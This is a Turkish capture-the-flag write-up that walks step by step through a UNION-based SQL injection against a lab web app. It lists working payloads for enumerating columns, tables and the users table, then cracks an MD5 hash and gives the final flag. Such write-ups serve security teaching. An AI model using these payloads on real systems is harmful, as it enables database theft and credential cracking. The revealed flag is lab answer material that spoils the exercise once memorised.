# SQL Injection - Member_Sql_Injection

## Adım 1: Kolon Sayısını Belirleme
```sql
1 union select 1       # Hata
1 union select 2       # Hata
1 union select 3       # Hata
→ 2 kolon var
Adım 2: Veritabanı Adını Öğrenme
sql1 union select 2, database()
Sonuç:

ID: 1 union select 2, database()
First name: 2
Surname: Member_Sql_Injection

→ Veritabanı adı: Member_Sql_Injection
Adım 3: Tablo Adlarını Listeleme
sql1 UNION SELECT NULL, GROUP_CONCAT(table_name) 
FROM information_schema.tables 
WHERE table_schema=database() -- -
Sonuç:

Surname: users

→ Tablo adı: users
Adım 4: Kolon Adlarını Öğrenme
sql1 UNION SELECT NULL, GROUP_CONCAT(column_name)
FROM information_schema.columns
WHERE table_schema=database() 
AND table_name=CHAR(117,115,101,114,115) -- -
Not: CHAR(117,115,101,114,115) = 'users'
Sonuç:

Surname: user_id,first_name,last_name,town,country,planet,Commentaire,countersign

→ Kolonlar: user_id, first_name, last_name, town, country, planet, Commentaire, countersign
Adım 5: Verileri Çekme
sql1 UNION SELECT 1, CONCAT(user_id, first_name, last_name, town, country, planet, Commentaire, countersign) 
FROM users
Sonuçlar:
user_idfirst_namelast_nametowncountryplanetCommentairecountersign (MD5)1onemeParisFranceEARTHJe pense, donc je suis2b3366bcfd44f540e630d4dc2b9b06d92twomeHelsinkiFinlandeEarthAamu on iltaa viisaampi.60e9032c586fb422e2c16dee6286cf103threemeDublinIrlandeEarthDublin is a city of stories and secrets.e083b24a01c483437bcf4a9eea7c1b4d5FlagGetThe424242Decrypt this password -> then lower all the char. Sh256 on it and it's good !5ff9d0165b4f92b14994e5c685cdce28
Adım 6: Şifre Kırma
MD5 Hash:
5ff9d0165b4f92b14994e5c685cdce28
Araç: https://crackstation.net/
Sonuç: FortyTwo
Flag Oluşturma:

Küçük harfe çevir: fortytwo
SHA256 hash al: https://emn178.github.io/online-tools/sha256.html

FLAG:
10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5